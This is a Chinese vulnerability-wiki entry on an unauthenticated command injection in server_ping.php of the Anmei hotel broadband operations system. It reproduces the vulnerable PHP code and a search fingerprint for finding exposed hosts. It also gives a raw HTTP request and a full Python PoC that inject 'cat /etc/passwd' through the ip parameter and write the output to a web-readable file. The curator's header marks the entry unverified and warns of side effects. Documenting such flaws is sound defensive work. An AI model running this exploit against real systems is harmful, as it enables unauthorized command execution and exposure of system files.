---
source: "Threekiii/Vulnerability-Wiki"
title: "安美数字酒店宽带运营 server_ping ip命令注入"
product: "安美数字酒店宽带运营"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Linux ping/popen；PHP变量来源配置未知"
prerequisites: "正文称无权限检查"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-8b0acaeaf887451e0e363f98"
entity_id: "ve-8b0acaeaf887451e0e363f98"
schema_version: "1"
---

# 安美数字酒店宽带运营 server_ping ip命令注入

## 条目说明

- 对象与具体问题：安美数字酒店宽带运营；server_ping ip命令注入
- 版本、配置及部署条件：Linux ping/popen；PHP变量来源配置未知
- 认证与权限前提：正文称无权限检查
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 代码直接$ip/$id无$_GET赋值，需说明包含文件提取参数或register_globals历史配置，不能默认所有PHP可复现
- 把passwd写../../test.txt为文件覆盖和敏感信息落盘，不是无副作用检测，缺清理
- 脚本parent+200仅第一步存在判定，第二root:可能命中遗留文件，需唯一标识/新鲜性证据
- 产品目录数字系统过泛，版本字段产品名；补固定版本/修复及输出权限

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行

### 漏洞影响

```
安美数字 酒店宽带运营系统
```

### 网络测绘

```
"酒店宽带运营"
```

### 漏洞复现

登录页面如下


![](./.resource/安美数字-酒店宽带运营系统-server_ping.php-远程命令执行漏洞/media/202202101906343.png)


存在漏洞的文件为 **server_ping.php**


```php
<?
if (!isset($ip) || $ip == "" || !isset($id) || $id == "") exit;

$cmd = "ping -c 2 -s 65 $ip";
$fp = popen($cmd, "r");
$getString = "";
if ($fp) {
	while (($line = fgets($fp, 512))) {
		$getString .= trim($line);
	}
	pclose($fp);
	
}

if (strstr($getString, "2 received, 0%")) {
	echo "<html><body><script language=\"javascript\">\n";
	echo "parent.doTestResult('$id', 'ok');\n";
	echo "</script></body></html>\n";
} else {
	echo "<html><body><script language=\"javascript\">\n";
	echo "parent.doTestResult('$id', 'no');\n";
	echo "</script></body></html>\n";
}
?>
```


漏洞位置为


```plain
$cmd = "ping -c 2 -s 65 $ip";
$fp = popen($cmd, "r");
```


GET传入 **$ip参数** 后直接命令执行，并且文件无权限要求


请求包为


```http
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
```


![](./.resource/安美数字-酒店宽带运营系统-server_ping.php-远程命令执行漏洞/media/202202101907634.png)


### 漏洞POC


```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞            \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 cat /etc/passwd>../../test.txt \033[0m".format(target_url))
        if "parent" in response.text and response.status_code == 200:
            vuln_url = target_url + "/test.txt"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
            if "root:" in response.text:
                print("\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\n{} \033[0m".format(response.text))
            else:
                print("\033[31m[x] 请求失败:{} \033[0m")
        else:
            print("\033[31m[x] 请求失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```


![](./.resource/安美数字-酒店宽带运营系统-server_ping.php-远程命令执行漏洞/media/202202101907822.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
